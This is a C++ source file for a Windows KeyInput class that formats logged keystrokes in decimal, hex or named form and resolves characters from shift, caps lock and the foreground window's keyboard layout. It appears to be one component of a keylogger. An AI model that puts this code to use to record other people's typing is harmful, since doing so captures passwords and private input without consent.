#include "../../include/key_input.h"

#include <Windows.h>

KeyInput::KeyInput(LoggingFormat logging_format)
    : _LOGGING_FORMAT(logging_format), _MOUSE_IGNORE(true) {
    if (_LOGGING_FORMAT == LoggingFormat::Default) initializeKeyNames();
}

bool KeyInput::IgnoreMouse(int keyStroke) {
    return _MOUSE_IGNORE && (keyStroke == VK_LBUTTON || keyStroke == VK_RBUTTON);
}

void KeyInput::FormatOutputBasedOnLogging(std::stringstream& output, int keyStroke) {
    if (_LOGGING_FORMAT == LoggingFormat::Decimal){
        output << '[' << keyStroke << ']';
    }
    else if (_LOGGING_FORMAT == LoggingFormat::Hexadecimal){
        output << std::hex << "[" << keyStroke << ']';
    }
    else{
        appendKeyNameOrCharacter(output, keyStroke);
    }
}

void KeyInput::initializeKeyNames() {
    _VIRTUAL_KEY_NAME = {
        {VK_BACK,       "[BACKSPACE]" },
        {VK_RETURN,	    "\n"          },
        {VK_SPACE,	    "_"           },
        {VK_TAB,	    "[TAB]"       },
        {VK_SHIFT,	    "[SHIFT]"     },
        {VK_LSHIFT,	    "[LSHIFT]"    },
        {VK_RSHIFT,	    "[RSHIFT]"    },
        {VK_CONTROL,    "[CONTROL]"   },
        {VK_LCONTROL,	"[LCONTROL]"  },
        {VK_RCONTROL,	"[RCONTROL]"  },
        {VK_MENU,	    "[ALT]"       },
        {VK_LWIN,	    "[LWIN]"      },
        {VK_RWIN,	    "[RWIN]"      },
        {VK_ESCAPE,	    "[ESCAPE]"    },
        {VK_END,	    "[END]"       },
        {VK_HOME,	    "[HOME]"      },
        {VK_LEFT,	    "[LEFT]"      },
        {VK_RIGHT,	    "[RIGHT]"     },
        {VK_UP,		    "[UP]"        },
        {VK_DOWN,	    "[DOWN]"      },
        {VK_PRIOR,	    "[PG_UP]"     },
        {VK_NEXT,	    "[PG_DOWN]"   },
        {VK_OEM_PERIOD,	"."           },
        {VK_DECIMAL,	"."           },
        {VK_OEM_PLUS,	"+"           },
        {VK_OEM_MINUS,	"-"           },
        {VK_ADD,		"+"           },
        {VK_SUBTRACT,	"-"           },
        {VK_CAPITAL,	"[CAPSLOCK]"  },
    };
}

void KeyInput::appendKeyNameOrCharacter(std::stringstream& output, int keyStroke) {
    if (_VIRTUAL_KEY_NAME.find(keyStroke) != _VIRTUAL_KEY_NAME.end())
    {
        output << _VIRTUAL_KEY_NAME.at(keyStroke);
    }
    else
    {
        char key = getKeyCharacter(keyStroke);
        output << char(key);
    }
}

char KeyInput::getKeyCharacter(int keyStroke) {
    HKL layout = getKeyboardLayout();
    bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

    if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
        || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
    {
        lowercase = !lowercase;
    }

    char key = MapVirtualKeyExA(keyStroke, MAPVK_VK_TO_CHAR, layout);

    if (!lowercase)
    {
        key = tolower(key);
    }

    return key;
}

HKL KeyInput::getKeyboardLayout() {
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }
    
    return layout;
}
